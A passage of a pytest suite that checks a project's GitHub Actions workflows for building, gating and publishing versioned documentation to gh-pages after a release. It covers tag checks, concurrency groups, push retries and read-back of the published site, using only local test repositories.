        """Which runs build the documentation and which deploy it, read off both jobs' ``if:``
        as the runner evaluates them, over the context GitHub gives each run.

        A pull request from a fork proposes arbitrary content and runs on this workflow
        definition, so it builds and never deploys: opening one would otherwise be enough to
        publish somebody else's revision as the product's documentation. A release deploys
        once Publish has published it (20:I3), and only then: Publish completes for every run
        it makes - a dispatch's dry run, a release it refused or failed - and so does a
        workflow called Publish in a pull request from a fork, which is why the event that
        started Publish's run is read as well as its conclusion. A run Publish's completion
        starts is given master as its own ref, so a condition resting on the ref alone would
        deploy every one of them. The deploy job's own condition says so too, so that the
        build's being skipped is not all that keeps a refused release off the site.
        """
        deploys = holds(setting(job(DOCS_WORKFLOW, "deploy"), "if", 4), context)
        assert (
            job_runs(DOCS_WORKFLOW, "build", context),
            job_runs(DOCS_WORKFLOW, "deploy", context),
            deploys,
        ) == (built, deployed, deployed), "(builds, deploys, the deploy job's own if holds)"

    def test_a_release_publishes_no_documentation_by_itself(self) -> None:
        """20:I3. Publish and the documentation both ran on ``release: published``, and neither
        waited for the other. Publish refused a tag naming a version ``pyproject.toml`` did not,
        and failed when its tests or its build did; the documentation, waiting for none of it,
        pushed the release's directory to ``gh-pages`` all the same - where
        ``tools/site_versions.py``, reading what is on disk, crowned it stable and pointed the
        root of the site at it."""
        assert "release" not in events(DOCS_WORKFLOW), (
            "a published release starts the documentation itself, before Publish has said "
            "whether the release is published at all"
        )

    def test_a_release_s_documentation_waits_for_publish(self) -> None:
        """What starts a release's documentation is Publish's run completing, watched by the
        name ``publish.yml`` gives itself."""
        triggers = events(DOCS_WORKFLOW)
        assert "workflow_run" in triggers, (
            "nothing starts the documentation when Publish completes, so a release's "
            "documentation either does not wait for Publish or is never published"
        )
        watched = re.search(r"^    workflows: \[([^]\n]*)\]$", triggers["workflow_run"], re.M)
        named = re.search(r"^name: (.+)$", PUBLISH_WORKFLOW, re.M)
        assert watched is not None and named is not None
        assert watched.group(1).split(", ") == [named.group(1)], (
            f"the documentation waits for {watched.group(1)}, and publish.yml is {named.group(1)}"
        )
        assert re.search(r"^    types: \[completed\]$", triggers["workflow_run"], re.M), (
            "the documentation starts before Publish's run has completed"
        )

    @staticmethod
    def handed(context: dict[str, Any]) -> str:
        """The ``ref`` the build job hands ``actions/checkout`` over ``context``; empty is
        checkout's own default, the run's own commit."""
        checkout = re.search(
            r"- uses: actions/checkout@\S+\n((?:        .*\n)*)", job(DOCS_WORKFLOW, "build")
        )
        assert checkout is not None, "the build job checks nothing out"
        ref = setting(checkout.group(1), "ref", 10)
        return "" if ref is None else text_of(evaluated(ref, context))

    def built(self, context: dict[str, Any]) -> str:
        """The commit the build job checks out over ``context``, as checkout resolves the
        ``ref`` it is handed: the run's own commit for an empty one, a commit as itself, and a
        release's tag as the commit it names, which is ``TAGGED`` here."""
        ref = self.handed(context)
        if not ref:
            return str(context["github"]["sha"])
        return TAGGED if ref.startswith("refs/tags/") else ref

    @pytest.mark.parametrize(
        ("context", "ref"),
        [
            (started_by("push", "refs/heads/master"), ""),
            (started_by("pull_request", "refs/pull/5/merge"), ""),
            (started_by("workflow_dispatch", "refs/heads/feature"), ""),
            (
                started_by("workflow_dispatch", "refs/heads/master", tag="v0.12.0"),
                "refs/tags/v0.12.0",
            ),
            (completed(), TAGGED),
        ],
        ids=[
            "a push to master",
            "a pull request",
            "a dispatch",
            "a dispatch naming a release",
            "a release Publish published",
        ],
    )
    def test_a_release_is_built_from_the_commit_its_tag_names(
        self, context: dict[str, Any], ref: str
    ) -> None:
        """A run Publish's completion starts is given master's newest commit as its own, and
        ``actions/checkout`` with no ``ref`` checks out the run's own commit: so the release's
        commit is named, from Publish's run. A dispatch naming a release is given the commit of
        the ref it was run on, master's, and checks out the tag it names, as a tag rather than
        anything else of that name. Every other run leaves ``ref`` empty, which is checkout's own
        default - the event's commit, as before."""
        assert self.handed(context) == ref, (
            f"the build checks out {self.handed(context) or 'the run s own commit'}, not {ref}"
        )

    def test_the_build_says_which_commit_it_built(
        self, tmp_path: Path, git: dict[str, str]
    ) -> None:
        """The deploy job names in its commit the commit the build was of, and only the build
        knows which that is - the run's own, a release's or a tag's - so the build hands it
        over: its step reporting what it checked out, run in a repository here, and its job's
        ``outputs:`` read over what that step wrote."""
        build = job(DOCS_WORKFLOW, "build")
        report = step(build, "Say which commit this build is of")
        name = re.search(r"^        id: (\S+)$", report, re.M)
        assert name is not None, "the step reporting the commit has no id to be read by"
        self.git_in(tmp_path, "init", "--quiet")
        (tmp_path / "page").write_bytes(b"a page\n")
        self.git_in(tmp_path, "add", "page")
        signed = ("-c", "user.name=build", "-c", "user.email=build@example.com")
        self.git_in(tmp_path, *signed, "commit", "--quiet", "--message", "a commit")
        head = self.git_in(tmp_path, "rev-parse", "HEAD").strip()
        done = run_step(report, tmp_path, **git, GITHUB_OUTPUT="output")
        assert done.returncode == 0, done.stdout + done.stderr
        written = dict(
            line.split("=", 1)
            for line in (tmp_path / "output").read_text(encoding="utf-8").splitlines()
        )
        outputs = re.search(r"^    outputs:\n((?:      .*\n)+)", build, re.M)
        assert outputs is not None, "the build job hands the deploy job nothing"
        commit = setting(outputs.group(1), "commit", 6)
        assert commit is not None, "the build job hands over no commit"
        context = {
            **started_by("push", "refs/heads/master"),
            "steps": {name.group(1): {"outputs": written}},
        }
        assert evaluated(commit, context) == head

    def chosen(self, cwd: Path, context: dict[str, Any]) -> subprocess.CompletedProcess[str]:
        """The deploy job's step choosing the directory, run over ``context``."""
        chooser = step(
            job(DOCS_WORKFLOW, "deploy"), "Choose the directory this build is published under"
        )
        return run_step(chooser, cwd, **step_environment(chooser, context), GITHUB_OUTPUT="output")

    @pytest.mark.parametrize(
        ("context", "directory"),
        [
            (started_by("push", "refs/heads/master"), "latest"),
            (started_by("workflow_dispatch", "refs/heads/master"), "latest"),
            (completed(), "v0.12.0"),
            (completed(head_branch="v0.10.0rc1"), "v0.10.0rc1"),
            (started_by("workflow_dispatch", "refs/heads/master", tag="v0.12.0"), "v0.12.0"),
        ],
        ids=[
            "a push to master",
            "a dispatch on master",
            "a release",
            "a release candidate",
            "a release named by hand",
        ],
    )
    def test_a_release_is_published_under_its_tag(
        self, tmp_path: Path, context: dict[str, Any], directory: str
    ) -> None:
        """A release's tag is the ``head_branch`` of Publish's run, since the run itself is
        given master as its ref: a step choosing by the run's own event or ref would put the
        release over ``latest``. A dispatch naming a release's tag is run on master as well, and
        is published under the tag it names, not as ``latest``."""
        done = self.chosen(tmp_path, context)
        assert done.returncode == 0, done.stdout + done.stderr
        assert (tmp_path / "output").read_text(encoding="utf-8") == f"name={directory}\n"

    @pytest.mark.parametrize(
        "context",
        [
            completed(head_branch="0.12.0"),
            started_by("workflow_dispatch", "refs/heads/master", tag="0.12.0"),
        ],
        ids=["a release Publish published", "a release named by hand"],
    )
    def test_a_release_tag_without_its_prefix_is_still_refused(
        self, tmp_path: Path, context: dict[str, Any]
    ) -> None:
        """The check the release event's runs made, kept for the runs Publish starts and for a
        release named by hand: a tag the version menu would never list is refused rather than
        published at a url nothing links to (``test_a_release_tag_has_to_carry_its_prefix``)."""
        done = self.chosen(tmp_path, context)
        assert done.returncode == 1, done.stdout + done.stderr
        assert done.stdout.startswith("::error::release tag 0.12.0 does not start with a v")
        assert not (tmp_path / "output").exists()

    @pytest.fixture
    def git(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> dict[str, str]:
        """git configured by nothing but each repository's own settings, here and in the steps
        run: a developer's signing key or line-ending rule has no business in what is asserted."""
        assert shutil.which("git") is not None, "the deploy job's steps run git, so git is needed"
        empty = tmp_path / "gitconfig"
        empty.write_bytes(b"")
        isolated = {"GIT_CONFIG_GLOBAL": empty.as_posix(), "GIT_CONFIG_NOSYSTEM": "1"}
        for name, value in isolated.items():
            monkeypatch.setenv(name, value)
        return isolated

    @staticmethod
    def git_in(cwd: Path, *arguments: str) -> str:
        done = subprocess.run(
            ["git", *arguments], cwd=cwd, capture_output=True, text=True, check=False
        )
        assert done.returncode == 0, f"git {' '.join(arguments)}: {done.stderr}"
        return done.stdout

    def site(self, tmp_path: Path) -> Path:
        """``gh-pages`` as a deploy finds it - master's documentation and v0.11.0's, indexed -
        in a bare repository standing for GitHub's."""
        seed = tmp_path / "seed"
        for name in ("latest", "v0.11.0"):
            (seed / name).mkdir(parents=True)
            (seed / name / "index.html").write_bytes(f"{name} as it was\n".encode())
        site_versions.write_index(seed)
        (seed / ".nojekyll").write_bytes(b"")
        origin = tmp_path / "origin.git"
        self.git_in(
            tmp_path, "init", "--quiet", "--bare", "--initial-branch=gh-pages", "origin.git"
        )
        self.git_in(seed, "init", "--quiet", "--initial-branch=gh-pages")
        self.git_in(seed, "add", "--all")
        signed = ("-c", "user.name=site", "-c", "user.email=site@example.com")
        self.git_in(seed, *signed, "commit", "--quiet", "--message", "the site")
        self.git_in(seed, "push", "--quiet", origin.as_uri(), "gh-pages")
        return origin

    def workspace(self, tmp_path: Path, origin: Path, build: str, page: str = "") -> Path:
        """A deploy job's workspace as its first steps leave it: the script writing the index,
        the build - a page saying ``page``, or the workspace's name - and ``gh-pages`` checked
        out as checkout leaves it, one commit deep."""
        workspace = tmp_path / build
        (workspace / "repository" / "tools").mkdir(parents=True)
        shutil.copy(ROOT / "tools" / "site_versions.py", workspace / "repository" / "tools")
        (workspace / "html").mkdir()
        (workspace / "html" / "index.html").write_bytes(f"{page or build}\n".encode())
        self.git_in(
            workspace, "clone", "--quiet", "--depth=1", "--branch=gh-pages", origin.as_uri(), "site"
        )
        return workspace

    def publish(
        self, workspace: Path, context: dict[str, Any], git: dict[str, str]
    ) -> subprocess.CompletedProcess[str]:
        """The deploy job's steps from the one choosing the directory to the last before the
        read back, run in order over ``context`` as the runner runs them, handed the commit the
        build checked out (``test_the_build_says_which_commit_it_built``); the first to fail
        ends the job."""
        context = {**context, "needs": {"build": {"outputs": {"commit": self.built(context)}}}}
        done = self.chosen(workspace, context)
        assert done.returncode == 0, done.stdout + done.stderr
        name = (workspace / "output").read_text(encoding="utf-8").removeprefix("name=").strip()
        context = {**context, "steps": {"slot": {"outputs": {"name": name}}}}
        deploy = steps_of(job(DOCS_WORKFLOW, "deploy"))
        first = next(n for n, one in enumerate(deploy) if "uses: actions/download-artifact" in one)
        last = next(n for n, one in enumerate(deploy) if one.startswith("name: Ask Pages where"))
        for one in deploy[first + 1 : last]:
            if holds(setting(one, "if", 8), context):
                done = run_step(one, workspace, **step_environment(one, context), **git)
                if done.returncode != 0:
                    break
        return done

    def test_a_release_lands_under_its_tag_beside_what_was_there(
        self, tmp_path: Path, git: dict[str, str]
    ) -> None:
        """The deploy job's steps for a release Publish published, over a site holding master's
        documentation and the release before: the release lands under its tag, nothing else is
        touched, the index crowns it, and the commit saying so names the release's commit
        rather than the run's own, which is master's. Its push lands, so the step stops there,
        with no account of a refusal that never happened."""
        origin = self.site(tmp_path)
        done = self.publish(self.workspace(tmp_path, origin, "release"), completed(), git)
        assert done.returncode == 0, done.stdout + done.stderr
        assert not re.search(r"^attempt \d+:", done.stdout, re.M), (
            f"a push that landed is reported as refused: {done.stdout}"
        )
        held = self.git_in(origin, "ls-tree", "--name-only", "gh-pages").split()
        assert "v0.12.0" in held, f"the release is not published under its tag: the site is {held}"
        assert self.git_in(origin, "show", "gh-pages:v0.12.0/index.html") == "release\n"
        assert self.git_in(origin, "show", "gh-pages:latest/index.html") == "latest as it was\n"
        assert json.loads(self.git_in(origin, "show", "gh-pages:versions.json")) == {
            "stable": "v0.12.0",
            "versions": ["latest", "v0.12.0", "v0.11.0"],
        }
        assert self.git_in(origin, "log", "-1", "--format=%s", "gh-pages") == (
            f"docs: publish v0.12.0 from {TAGGED}\n"
        )

    @pytest.mark.parametrize(
        "context",
        [started_by("push", "refs/heads/master"), completed()],
        ids=["master's", "a release's"],
    )
    def test_a_deploy_that_would_change_nothing_pushes_nothing(
        self, tmp_path: Path, git: dict[str, str], context: dict[str, Any]
    ) -> None:
        """A deploy with nothing to change on the site - a push to master touching no page, or
        the re-run a failed read-back calls for - commits and pushes nothing, and the step
        passes saying why: committing with nothing staged would fail the step under ``bash -e``
        before the read-back. The second deploy here checks the site out after the first has
        pushed, as a re-run's fresh runner does, and publishes the same build."""
        origin = self.site(tmp_path)
        first = self.publish(self.workspace(tmp_path, origin, "first"), context, git)
        assert first.returncode == 0, first.stdout + first.stderr
        tip = self.git_in(origin, "rev-parse", "gh-pages")
        again = self.workspace(tmp_path, origin, "again", page="first")
        done = self.publish(again, context, git)
        assert done.returncode == 0, done.stdout + done.stderr
        assert "the site is already in this state, nothing to archive" in done.stdout
        assert not re.search(r"^attempt \d+:", done.stdout, re.M), done.stdout
        assert self.git_in(origin, "rev-parse", "gh-pages") == tip, (
            "a deploy changing nothing pushed"
        )

    def test_a_dispatch_can_name_a_release_s_tag(self) -> None:
        """The route for a release no re-run of its Publish can finish: a dispatch names the
        release's tag. The input is optional and empty by default, so that a dispatch naming
        none is the dispatch it always was."""
        dispatch = events(DOCS_WORKFLOW)["workflow_dispatch"]
        tag = re.search(r"^      tag:\n((?:        .*\n)+)", dispatch, re.M)
        assert tag is not None, "a dispatch cannot name a release's tag"
        assert setting(tag.group(1), "type", 8) == "string"
        assert setting(tag.group(1), "required", 8) == "false"
        assert setting(tag.group(1), "default", 8) == '""'
        assert setting(tag.group(1), "description", 8) == (
            "A release's tag, to publish its documentation when no re-run of its Publish can"
        ), "the dispatch no longer says what its tag is for"

    @staticmethod
    def check_of_the_tag() -> str:
        return step(
            job(DOCS_WORKFLOW, "build"), "Check the tag names the version its commit states"
        )

    @pytest.mark.parametrize(
        ("context", "checks"),
        [
            (started_by("push", "refs/heads/master"), False),
            (started_by("pull_request", "refs/pull/5/merge"), False),
            (started_by("workflow_dispatch", "refs/heads/master"), False),
            (started_by("workflow_dispatch", "refs/heads/master", tag="v0.12.0"), True),
            (completed(), True),
        ],
        ids=[
            "a push to master",
            "a pull request",
            "a dispatch",
            "a release named by hand",
            "a release Publish published",
        ],
    )
    def test_only_a_release_s_run_checks_its_tag(
        self, context: dict[str, Any], checks: bool
    ) -> None:
        """Master's documentation, a pull request's and an ordinary dispatch's name no tag to
        check; a release's run does, whichever of the two routes started it."""
        assert holds(setting(self.check_of_the_tag(), "if", 8), context) == checks

    @pytest.mark.parametrize(
        ("tag", "version", "refused"),
        [("v0.12.0", "0.12.0", False), ("v0.12.0", "0.12.1", True), ("0.12.0", "0.12.0", True)],
        ids=["the tag of the version", "another version's tag", "the version without its v"],
    )
    @pytest.mark.parametrize("route", ["a release Publish published", "a release named by hand"])
    def test_a_tag_naming_another_version_than_its_commit_is_refused(
        self, tmp_path: Path, route: str, tag: str, version: str, refused: bool
    ) -> None:
        """Publish refuses a release whose tag is not ``v`` and the version ``pyproject.toml``
        states, before it uploads anything - the whole tag, its ``v`` included, as
        ``test_a_release_tag_has_to_carry_its_prefix`` pins there. A release named by hand has
        been through no Publish, so the build makes the same check of the tree it checked out,
        and refuses to publish documentation under a version that commit does not state; a
        release Publish published passes it again."""
        context = (
            completed(head_branch=tag)
            if route == "a release Publish published"
            else started_by("workflow_dispatch", "refs/heads/master", tag=tag)
        )
        (tmp_path / "pyproject.toml").write_bytes(
            f'[project]\nname = "ddd-tool"\nversion = "{version}"\n'.encode()
        )
        check = self.check_of_the_tag()
        done = run_step(check, tmp_path, **step_environment(check, context))
        if not refused:
            assert done.returncode == 0, done.stdout + done.stderr
            return
        assert done.returncode == 1, done.stdout + done.stderr
        assert done.stdout.splitlines() == [
            f"::error::tag {tag} is not v{version}, the version pyproject.toml states at the",
            "::error::commit it names. A release's documentation is published under its tag,",
            "::error::which has to be v and that version; name the tag of a release.",
        ]

    def test_a_release_named_by_hand_lands_under_its_tag(
        self, tmp_path: Path, git: dict[str, str]
    ) -> None:
        """The deploy job's steps for a dispatch from master naming a release's tag, over the
        site a release finds: it lands as a release Publish published does - under its tag, the
        index crowning it - and the commit saying so names the commit the tag names, not
        master's, which the dispatch ran on."""
        origin = self.site(tmp_path)
        dispatched = started_by("workflow_dispatch", "refs/heads/master", tag="v0.12.0")
        done = self.publish(self.workspace(tmp_path, origin, "release"), dispatched, git)
        assert done.returncode == 0, done.stdout + done.stderr
        held = self.git_in(origin, "ls-tree", "--name-only", "gh-pages").split()
        assert "v0.12.0" in held, f"the release is not published under its tag: the site is {held}"
        assert self.git_in(origin, "show", "gh-pages:v0.12.0/index.html") == "release\n"
        assert self.git_in(origin, "show", "gh-pages:latest/index.html") == "latest as it was\n"
        assert json.loads(self.git_in(origin, "show", "gh-pages:versions.json")) == {
            "stable": "v0.12.0",
            "versions": ["latest", "v0.12.0", "v0.11.0"],
        }
        assert self.git_in(origin, "log", "-1", "--format=%s", "gh-pages") == (
            f"docs: publish v0.12.0 from {TAGGED}\n"
        )

    @staticmethod
    def publishing_this_documentation() -> str:
        """The developer page's section on the site, its line breaks flattened."""
        page = PAGES["docs/developer_documentation.rst"]
        section = page.split("\nPublishing this documentation\n", 1)[1]
        return flattened(section.split("\n.. _publishing-a-release:", 1)[0])

    def test_the_page_says_a_release_s_documentation_waits_for_publish(self) -> None:
        """20:I3 where a maintainer reads it: what deploys, why a release waits for Publish
        and what not waiting cost, what starts a release's run and what it builds, what a
        failed Publish costs, and what writes a version's directory."""
        said = self.publishing_this_documentation()
        claims = {
            "what deploys": "deploys on a push to ``master`` and for a release - the release "
            "once ``publish.yml`` has published it",
            "why a release waits": "a release can be one Publish refuses",
            "what not waiting cost": "became the version its root redirects to",
            "what a release starts": "the release starts no documentation run",
            "when a release's run goes on": "builds and deploys only if Publish's run was a "
            "release's and succeeded",
            "what it builds": "from the commit the release's tag names, and under the tag",
            "what an older release still does": "GitHub runs a release's workflows from its tag, "
            "so that commit's own ``docs.yml`` still publishes it on the release event",
            "what re-run publishes a failed release": "with *Re-run failed jobs*, which runs "
            "again only the jobs that failed",
            "why re-running every job cannot": "*Re-run all jobs* cannot pass once the release is "
            "on PyPI",
            "what publishes a release no re-run can finish": "is published by hand: run "
            "*Documentation* from ``master`` with the release's tag as ``tag``",
            "what that run builds and refuses": "builds the commit the tag names, refuses a tag "
            "that is not ``v`` followed by the version ``pyproject.toml`` states at that commit, "
            "as Publish does",
            "what else it goes through": "publishes the release under its tag through every "
            "check a release's run makes",
            "what writes a version": "that release, once Publish has published it",
            "what rewrites one": "only by that release's own runs",
            "what the deploy job names": "the Publish run it waits for",
            "why the Publish run is read": "a workflow called Publish in a pull request from a "
            "fork completes as well",
        }
        missing = [what for what, claim in claims.items() if claim not in said]
        assert not missing, f"the developer page no longer says {missing}"
        assert "a published release" not in said, "the page still has a release deploy itself"

    def group(self, context: dict[str, Any]) -> tuple[str, bool]:
        """The concurrency group a run is put in over ``context``, and whether it cancels the
        run going in it."""
        top = DOCS_WORKFLOW.split("\nconcurrency:\n", 1)[1]
        block = re.split(r"\n(?=\S)", top, maxsplit=1)[0] + "\n"
        group, cancels = setting(block, "group", 2), setting(block, "cancel-in-progress", 2)
        assert group is not None and cancels is not None, "the workflow has no concurrency group"
        return text_of(evaluated(group, context)), truthy(evaluated(cancels, context))

    @pytest.mark.parametrize(
        "release",
        [completed(), started_by("workflow_dispatch", "refs/heads/master", "v0.12.0", "45")],
        ids=["a release Publish published", "a release named by hand"],
    )
    def test_a_release_s_run_is_alone_in_its_group(self, release: dict[str, Any]) -> None:
        """20:M5. GitHub keeps one run going and one waiting in a concurrency group, and cancels
        the waiting one when another arrives. A release's run waiting behind master's was
        therefore cancelled by the next push to master, with nothing red and no directory for
        the release. Alone in a group of its own, a release's run never waits, and so is never
        the waiting run anything replaces - not master's, not another release's, not a re-run
        of its own Publish - whether Publish's completion started it or a dispatch naming its
        tag did."""
        group, cancels = self.group(release)
        others = {
            self.group(other)[0]
            for other in (
                started_by("push", "refs/heads/master"),
                started_by("workflow_dispatch", "refs/heads/master"),
                started_by("workflow_dispatch", "refs/heads/feature"),
                started_by("pull_request", "refs/pull/5/merge"),
                started_by("workflow_dispatch", "refs/heads/master", "v0.12.0", "46"),
                completed(run_id="43"),
                completed(head_branch="v0.11.1", run_id="44"),
            )
        }
        assert group not in others, f"a release's run waits in {group} with other runs"
        assert not cancels, "a release's run cancels the run going in its group"

    def test_master_s_runs_still_queue_and_a_pull_request_s_are_superseded(self) -> None:
        """What did not change: master's deploys wait behind one another, so that two never
        push at once, and a pull request's newer build replaces the one it supersedes."""
        queued = ("docs-publish", False)
        assert self.group(started_by("push", "refs/heads/master")) == queued
        assert self.group(started_by("workflow_dispatch", "refs/heads/master")) == queued
        assert self.group(started_by("pull_request", "refs/pull/5/merge")) == (
            "docs-refs/pull/5/merge",
            True,
        )

    @pytest.mark.parametrize(
        ("first", "directory", "versions"),
        [
            (started_by("push", "refs/heads/master"), "latest", ["latest", "v0.12.0", "v0.11.0"]),
            (
                completed(head_branch="v0.11.1", run_id="43"),
                "v0.11.1",
                ["latest", "v0.12.0", "v0.11.1", "v0.11.0"],
            ),
        ],
        ids=["master's", "another release's"],
    )
    def test_a_deploy_the_branch_moved_under_publishes_over_what_it_now_holds(
        self,
        tmp_path: Path,
        git: dict[str, str],
        first: dict[str, Any],
        directory: str,
        versions: list[str],
    ) -> None:
        """20:M5's second half. With a release's run waiting in no group, its deploy and
        another can run at once, each holding ``gh-pages`` as its checkout found it: the second
        to push is refused, and a merge would not do, since both rewrote ``versions.json`` and
        the root redirect. Both deploys check the site out here before either pushes, and the
        second publishes over what the first left - the first's directory kept, the index
        rewritten over both, and the branch's history unbroken."""
        origin = self.site(tmp_path)
        release = self.workspace(tmp_path, origin, "release")
        other = self.workspace(tmp_path, origin, "other")
        landed = self.publish(other, first, git)
        assert landed.returncode == 0, landed.stdout + landed.stderr
        done = self.publish(release, completed(), git)
        assert done.returncode == 0, done.stdout + done.stderr
        assert "attempt 1: the push was refused" in done.stdout, "the branch never moved"
        assert json.loads(self.git_in(origin, "show", "gh-pages:versions.json")) == {
            "stable": "v0.12.0",
            "versions": versions,
        }
        assert self.git_in(origin, "show", f"gh-pages:{directory}/index.html") == "other\n"
        assert self.git_in(origin, "show", "gh-pages:v0.12.0/index.html") == "release\n"
        published = self.git_in(origin, "log", "--format=%s", "gh-pages").splitlines()
        assert published[0] == f"docs: publish v0.12.0 from {TAGGED}"
        assert published[1].startswith(f"docs: publish {directory} from ")

    def test_a_push_refused_every_time_fails_saying_so(
        self, tmp_path: Path, git: dict[str, str]
    ) -> None:
        """Taking the branch again is for a branch that moved: a push the remote refuses every
        time - a token that may not write, a protected branch - is tried five times, and the
        run then fails saying what happened, with the site as it was."""
        origin = self.site(tmp_path)
        hook = origin / "hooks" / "pre-receive"
        hook.write_bytes(b"#!/bin/sh\necho 'refused by the test'\nexit 1\n")
        hook.chmod(0o755)
        done = self.publish(self.workspace(tmp_path, origin, "release"), completed(), git)
        assert done.returncode == 1, done.stdout + done.stderr
        attempts = re.findall(r"^attempt (\d+): the push was refused", done.stdout, re.M)
        assert attempts == ["1", "2", "3", "4", "5"], done.stdout
        assert "::error::gh-pages refused the push of v0.12.0 five times" in done.stdout
        assert "Nothing of v0.12.0 is published" in done.stdout
        held = self.git_in(origin, "ls-tree", "--name-only", "gh-pages").split()
        assert "v0.12.0" not in held, f"a refused push published something: {held}"

    def test_the_page_says_a_push_to_master_cannot_cancel_a_release_s_run(self) -> None:
        """20:M5 where a maintainer reads it, beside what a release's documentation does: what
        GitHub does with a group's waiting run, what that cost a release, what holds now, and
        what two deploys at once do."""
        said = self.publishing_this_documentation()
        claims = {
            "what holds": "A release's run is alone in a concurrency group of its own, so a push "
            "to ``master`` cannot cancel it.",
            "what GitHub does": "cancels the waiting one when another arrives",
            "why master's may queue": "``master``'s runs share a group, where that costs nothing",
            "what queueing cost a release": "a release's run waiting there was cancelled by the "
            "next merge",
            "what a dispatch off master costs": "A dispatch on another branch naming no tag waits "
            "in ``master``'s group as well, and deploys nothing, so when it replaces ``master``'s "
            "waiting run, ``latest`` stays a push behind until the next push",
            "what follows": "A release's deploy and ``master``'s can therefore run at once",
            "what a refused push does": "puts its own directory back on it, rewrites the index "
            "from that, and pushes again",
        }
        missing = [what for what, claim in claims.items() if claim not in said]
        assert not missing, f"the developer page no longer says {missing}"

    def test_the_deployment_is_read_back_from_the_site_it_published_to(self) -> None:
        """The branch is the site, and a push that lands is still not proof that it is served.

        When the branch and the site were two publishes - a git push and an artifact handed
        to Pages - they parted twice while every step reported success: a release sat in
        the archive, named in the version index beside it, while the site went on serving a
        build assembled before the release existed - a complete set of documentation at a
        url that answered 404, with nothing red anywhere to say so. Serving the branch
        removed the second publish; a Pages source left on the wrong setting would bring the
        silence back.

        So the run ends by reading back what it just published, which is the only statement
        about the site that is made from outside the machinery that writes it.
        """
        pushed = DOCS_WORKFLOW.split("git -C site push origin gh-pages", 1)
        assert len(pushed) == 2, "the workflow no longer publishes by pushing the branch once"
        after = pushed[1]
        assert "versions.json" in after and "${SLOT}" in after, (
            "nothing after the push checks that the site serves the version just published, "
            "so a site one build behind reports success"
        )
        assert "cb=" in after, (
            "the read back is cacheable, so an edge answering for the previous build passes"
        )

    def test_a_release_tag_has_to_carry_its_prefix(self) -> None:
        """The ``v`` is load bearing, and both workflows have to insist on it.

        A release is published under a directory named after its tag, and the version menu
        lists only the directories starting with ``v``. So a tag of ``0.5.0`` deploys a
        complete copy of the documentation to a url nothing links to, leaves the root
        redirecting at ``latest``, and reports success. It happened once, because the
        version check stripped an optional ``v`` before comparing and so accepted both
        spellings; what caught it was an unrelated environment rule.
        """
        assert '"$GITHUB_REF_NAME" != "v$version"' in PUBLISH_WORKFLOW, (
            "the release tag is compared without its prefix, which accepts a tag the "
            "documentation site cannot publish under"
        )
        assert "v[0-9]*)" in DOCS_WORKFLOW, (
            "the deployment no longer refuses a tag the version menu would never list"
        )

    def test_nothing_is_published_under_an_unchecked_tag(self) -> None:
        """The tag check lives in one job, so every job that publishes has to be behind it.

        The extension job names the .vsix it uploads after the tag. Left needing only the
        test job it ran beside the check rather than after it, which for an upload onto a
        published release is the wrong side to be on.
        """
        extension = PUBLISH_WORKFLOW.split("\n  extension:\n", 1)[1]
        needs = next(line for line in extension.splitlines() if line.strip().startswith("needs:"))
        assert "build" in needs, (
            f"the extension is published without waiting for the tag check: {needs.strip()}"
        )

    def test_the_index_upload_is_reachable_only_from_a_tag(self) -> None:
        """``workflow_dispatch`` is the dry run, and a dry run may not reach pypi.org.

        The dispatch offers a ``pypi`` target and runs on whichever ref it was started from.
        Gated on that input alone, a run started on a feature branch built whatever
        ``pyproject.toml`` said *there* and uploaded it - immutably, under no tag, with the
        tag check skipped (it is a release only step), no ``.vsix`` and no documentation
        directory, all of which are release only too. An index accepts a file name once and
        for ever, so the only way back from that is the next version number.
        """
        job = PUBLISH_WORKFLOW.split("\n  publish-pypi:\n", 1)[1]
        condition = next(line for line in job.splitlines() if line.strip().startswith("if:"))
        assert "startsWith(github.ref, 'refs/tags/v')" in condition, (
            f"a dispatch from any ref at all can upload to pypi.org: {condition.strip()}"
        )

    def test_the_tag_check_covers_every_run_that_can_upload(self) -> None:
        """Whatever may publish has to have had its tag compared with what was built.

        The check exists because the version lives in ``pyproject.toml`` and the tag is typed
        by hand. Running it for the release event only left the other door - a dispatch from a
        tag - opening onto an upload whose file name nobody had compared with anything.
        """
        step = PUBLISH_WORKFLOW.split("name: Check tag matches package version\n", 1)[1]
        condition = next(line for line in step.splitlines() if line.strip().startswith("if:"))
        assert "github.event_name == 'release'" in condition, (
            f"a release no longer has its tag compared with the version: {condition.strip()}"
        )
        assert "startsWith(github.ref, 'refs/tags/v')" in condition, (
            f"a dispatch from a tag uploads without the tag being checked: {condition.strip()}"
        )

    def test_the_site_is_published_by_pushing_the_branch(self) -> None:
        """Pages serves ``gh-pages`` itself, and nothing hands it a second copy.

        It used to receive both: the workflow pushed the branch *and* uploaded an artifact
        assembled from it. ``actions/deploy-pages`` addresses a deployment by commit sha, and a
        release tag points at the commit master's own push has already deployed - so the
        release's deployment was a duplicate id, discarded, and the action reported success in
        five seconds while the site went on serving the earlier build. It cost 0.6.0 and 0.7.0,
        and both times every step of every job was green.

        Nothing a reader can see distinguishes the two arrangements, which is why the one that
        works is pinned here. The check this replaced kept the branch's git directory out of
        the uploaded artifact; with no artifact, there is no directory to hand anywhere.
        """
        assert "uses: actions/deploy-pages" not in DOCS_WORKFLOW, (
            "the site is deployed as an artifact again: that is keyed by commit sha, so a "
            "release whose tag sits on an already deployed commit is silently discarded"
        )
        assert "uses: actions/upload-pages-artifact" not in DOCS_WORKFLOW, (
            "a second copy of the site is uploaded beside the branch that is the site"
        )
        assert "git -C site push origin gh-pages" in DOCS_WORKFLOW, (
            "the workflow no longer publishes by pushing the branch Pages serves"
        )

    def test_the_workflow_says_why_the_branch_needs_its_nojekyll(self) -> None:
        """20:M12. The comment beside ``.nojekyll`` said that an artifact this workflow uploaded
        was served without Jekyll, and that the file was written so that the Pages source could
        move to the branch. The source has moved: Pages serves the branch, the workflow uploads
        no artifact Pages serves, and the file is what keeps Jekyll off the site."""
        said = comments_of(DOCS_WORKFLOW)
        claims = {
            "why it is needed": "Pages serves this branch, so the .nojekyll at its root is what "
            "keeps Jekyll off every version the branch holds",
            "what would not notice": "the read-back below asks for a page and the version index, "
            "and would not notice its loss",
        }
        missing = [what for what, claim in claims.items() if claim not in said]
        assert not missing, f"docs.yml no longer says {missing}"
        assert "currently uploads" not in said
        assert "touch site/.nojekyll" in uncommented(DOCS_WORKFLOW)


class TestTheVersionIndexOfTheSite:
    """What a reader arriving at the root of the documentation site lands on.

    The menu on every page reads ``versions.json``, including the pages of versions published
    long before the one being deployed, and the root of the site redirects to whichever
    version that file calls stable. Both are written by ``tools/site_versions.py``, which the
